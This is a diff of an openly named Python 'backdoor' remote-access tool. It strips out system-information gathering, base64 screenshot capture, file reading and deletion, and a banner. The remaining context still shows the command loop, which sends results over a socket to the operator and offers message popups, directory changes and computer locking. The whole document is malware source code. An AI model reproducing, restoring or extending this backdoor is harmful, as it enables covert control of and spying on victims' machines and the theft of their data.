@@ -6,17 +6,9 @@
 import socket
 import os
 import time
-import platform
-import psutil # dependency
 import subprocess
-from PIL import ImageGrab # dependency
-import datetime
-import base64
 import ctypes
-import sqlite3
 from io import open
-import json
-import shutil
 
 class backdoor:
 	try:
@@ -42,12 +34,7 @@ class backdoor:
 	# intial message
 	def initial_message(self):
 		message = "\n"
-		message += "   |\   /|                              \n"
-		message += "   | | | |    _      ___       __  __   \n"
-		message += "   |  =  |   / \    / _/ |\// |   |  \  \n"
-		message += "   | | | |  / = \  | |_  ||-  |== | = | \n"
-		message += "   |/   \| /_/ \_\  \__\ |/\\\ |__ |__/ \n"
-		message += "                                        \n"
+		message += "=============================\n"
 		message += "[+] Connection recieved from: " + socket.gethostname() + "\n"
 		message += "[+] Type 'h' to see all options\n"
 		message += "============================="
@@ -60,11 +47,8 @@ class backdoor:
 		commands = "========== Help Menu =========\n"
 		commands += "- h			=> get all commands                     \n"
 		commands += "- exit			=> exit from the system                 \n"
-		commands += "- user			=> get current user                     \n"
 		commands += "- cd <path>		=> change to a determined path          \n"
 		commands += "- message <message>	=> write a mesage to the user           \n"
-		commands += "- screenshot		=> get a base64 screenshot of the system\n"
-		commands += "- lock			=> lock the computer                    \n"
 		commands += "============================="
 
 		return commands
@@ -84,40 +68,6 @@ class backdoor:
 			return "[+] Current user: " + str(user)
 		except Exception as err:
 			return "[-] Couldn't get the username: " + str(err)
-
-	# get system info
-	def get_system_info(self):
-		info = ""
-		info += "======== System Info ========\n"
-		
-		info += "Plataform: " + str(platform.system()) + "\n"
-		info += "Released Date: " + str(platform.release()) + "\n"
-		info += "Version: " + str(platform.version()) + "\n"
-		info += "Architeture: " + str(platform.machine()) + "\n"
-		info += "Hostname: " + str(socket.gethostname()) + "\n"
-		info += "IP: " + str(socket.gethostbyname(socket.gethostname())) + "\n"
-		info += "Processador: " + str(platform.processor()) + "\n"
-		info += "RAM: " + str(round(psutil.virtual_memory().total / (1024.0 **3))) +" GB" + "\n"
-
-		info += "============================="
-
-		return info
-
-	# screenshot
-	def get_screenshot(self):
-		try:
-			current_time = datetime.datetime.now()
-			screenshot = ImageGrab.grab()
-			
-			path = "{}/Screenshot{}{}{}.png".format(self.USER_PROFILE, current_time.year, current_time.month, current_time.day)
-			screenshot.save(path)
-
-			data = self.read_file(path)
-			self.delete_path(path)
-            
-			return data
-		except Exception as err:
-			return "[-] Error getting screenshot: " + str(err)
 
 	# show message box popup
 	def show_message_box(self, message):
@@ -141,26 +91,6 @@ class backdoor:
 			return "[+] Successfully locked the computer"
 		except Exception as err:
 			return "[-] Falied to lock the computer: " + str(err)
-
-	# read file
-	def read_file(self, path):
-		try:
-			with open(path, "rb") as file:
-				return base64.b64encode(file.read()).decode()
-		except Exception as err:
-			return "[-] (Client) Error reading: " + str(err)
-
-	# delete file/path
-	def delete_path(self, path):
-		try:
-			if os.path.isdir(path):
-				shutil.rmtree(path)
-			elif os.path.isfile(path):
-				os.remove(path)
-
-				return "[+] Successfully deleted: " + path
-		except Exception as err:
-			return "[-] Error deleting: " + path + " | error: " + str(err)
 
 
 	# loop shell function
@@ -189,19 +119,9 @@ class backdoor:
 				ret = self.change_working_directory(cmd_rest)
 				self.con.send(ret + "\r\n")
 
-			# get system info
-			elif cmd_0 == "info":
-				ret = self.get_system_info()
-				self.con.send(ret + "\r\n")
-
 			# message box
 			elif cmd_0 == "message":
 				ret = self.show_message_box(cmd_rest)
-				self.con.send(ret + "\r\n")
-
-			# screnshot
-			elif cmd_0 == "screenshot":
-				ret = self.get_screenshot()
 				self.con.send(ret + "\r\n")
 
 			# lock computer
